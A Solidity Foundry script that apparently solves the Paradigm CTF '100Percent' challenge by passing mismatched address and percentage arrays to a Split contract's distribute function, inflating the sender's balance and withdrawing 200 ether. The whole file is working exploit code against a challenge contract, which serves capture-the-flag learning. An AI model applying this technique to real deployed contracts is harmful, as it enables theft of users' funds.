// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/100Percent/Challenge.sol";

contract ExploitScript is Script {
    Challenge challenge = Challenge(vm.envAddress("CHALLENGE_ADDRESS"));
    address sender = vm.addr(vm.envUint("PRIVATE_KEY"));
    Split SPLIT;

    function setUp() public {}

    function run() public {
        vm.createSelectFork(vm.rpcUrl("paradigm"));
        vm.startBroadcast(sender);
        SPLIT = challenge.SPLIT();
        address[] memory ogaddrs = new address[](2);
        ogaddrs[0] = address(0x000000000000000000000000000000000000dEaD);
        ogaddrs[1] = address(0x000000000000000000000000000000000000bEEF);
        uint32[] memory ogpercents = new uint32[](2);
        ogpercents[0] = 5e5;
        ogpercents[1] = 5e5;

        SPLIT.distribute(0, ogaddrs, ogpercents, 0, IERC20(address(0x00)));
        uint32 relayerFee = 0;

        //removes all ether from split wallet into split contract

        address[] memory addrs = new address[](2);
        addrs[0] = address(sender);
        addrs[1] = address(2e6);

        uint32[] memory percents = new uint32[](2);
        percents[0] = 1e6;
        percents[1] = 0;

        address[] memory fakeAddrs = new address[](1);
        fakeAddrs[0] = address(sender);

        uint32[] memory fakePercents = new uint32[](3);
        fakePercents[0] = 2e6;
        fakePercents[1] = 1e6;
        fakePercents[2] = 0;

        uint id = SPLIT.createSplit(addrs, percents, relayerFee);
        Split.SplitData memory splitData = SPLIT.splitsById(id);
        splitData.wallet.deposit{value: 100 ether}();

        SPLIT.distribute(
            id,
            fakeAddrs,
            fakePercents,
            relayerFee,
            IERC20(address(0x00))
        );

        IERC20[] memory tokens = new IERC20[](1);
        uint256[] memory amounts = new uint256[](1);
        tokens[0] = IERC20(address(0x00));
        amounts[0] = 200 ether;

        SPLIT.withdraw(tokens, amounts);
        console.log("is solved: ", challenge.isSolved());
    }
}
